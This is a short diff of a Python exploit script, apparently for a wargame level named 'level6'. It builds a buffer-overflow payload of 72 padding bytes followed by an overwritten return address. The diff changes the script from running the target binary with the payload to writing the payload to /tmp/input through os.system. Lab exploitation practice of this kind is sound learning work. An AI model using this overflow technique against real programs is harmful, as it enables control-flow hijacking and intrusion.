@@ -3,7 +3,6 @@
 import os
 
 nAddr = "\x08\x04\x84\x54"[::-1]
-arg = 72*"A" + nAddr
-cmd = "/home/user/level6/level6 " + arg
-print(arg)
+payload = 72*"A" + nAddr
+cmd = "echo \"" + payload + "\" > /tmp/input"
 os.system(cmd)
